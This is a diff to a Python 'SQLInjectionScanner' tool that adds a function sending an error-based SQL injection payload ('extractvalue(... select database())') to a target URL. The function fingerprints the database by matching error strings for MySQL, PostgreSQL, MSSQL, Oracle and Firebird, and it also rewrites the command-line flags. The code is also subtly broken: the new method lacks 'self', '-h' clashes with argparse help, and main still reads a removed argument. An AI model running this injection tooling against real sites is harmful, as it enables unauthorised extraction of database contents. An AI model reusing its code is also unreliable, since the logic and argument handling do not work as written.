@@ -289,9 +289,6 @@ class SQLInjectionScanner:
                     print(result)
             except Exception as e:
                 print(f"Error performing POST request for query '{query}': {e}")
-    
-    async def close_session(self):
-        await self.session.close()
 
     async def get_current_user(self):
         print(f"Getting current user for {self.database_type} database...")
@@ -482,12 +479,61 @@ class SQLInjectionScanner:
                             print(f"MySQL: Retrieving current user response for query '{query}': {current_user}")
                 except Exception as e:
                     print(f"MySQL: Error performing POST request for query '{query}': {e}")
+                    
+    async def get_dbname(target_url):
+        db_dict = {
+            "MySQL": [
+                'MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()',
+                '1064 You have an error in your SQL syntax'
+            ],
+            "PostGre": [
+                'PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string', 'unterminated dollar-quoted string',
+                'column not found', 'relation not found', 'function not found'
+            ],
+            "Microsoft_SQL": [
+                'Microsoft SQL Server', 'Invalid object name', 'Unclosed quotation mark', 'Incorrect syntax near', 'SQL Server error',
+                'The data types ntext and nvarchar are incompatible'
+            ],
+            "Oracle": [
+                'ORA-', 'Oracle error', 'PLS-', 'invalid identifier', 'missing expression', 'missing keyword', 'missing right parenthesis',
+                'not a valid month'
+            ],
+            "Advantage_Database": [
+                'AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'
+            ],
+            "Firebird": [
+                'Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string',
+                'Invalid token'
+            ]
+        }
+
+        async with aiohttp.ClientSession() as session:
+            for db_type, identifiers in db_dict.items():
+                for identifier in identifiers:
+                    url = f"{target_url} and extractvalue(1,concat(1,(select database()))) --{identifier}"
+                    try:
+                        async with session.get(url) as response:
+                            data = await response.text()
+                            if identifier in data:
+                                soup = BS(data, features='html.parser')
+                                db_name = soup.get_text().strip()
+                                print(f"Database name for {db_type}: {db_name}")
+                                return
+                    except aiohttp.ClientError as e:
+                        print(f"Error during database name extraction for {db_type}: {e}")
+
+        print("Database name extraction failed for all database types.")
+
+
+    async def close_session(self):
+        await self.session.close()
 
 async def main():
     parser = argparse.ArgumentParser(description="SQL Injection Scanner")
-    parser.add_argument("target_url", help="Target URL")
-    parser.add_argument("--get_current_user", action="store_true", help="Retrieve current user")
-    parser.add_argument("--get_version", action="store_true", help="Retrieve database version")
+    parser.add_argument("-h", help="Target URL")
+    parser.add_argument("-gv", action="store_true", help="Retrieve database version")
+    parser.add_argument("-gcu", action="store_true", help="Retrieve current user")
+    parser.add_argument('-dbn', '--dbname', type=str, help='Get database name') 
     args = parser.parse_args()
 
     scanner = SQLInjectionScanner(args.target_url, "")
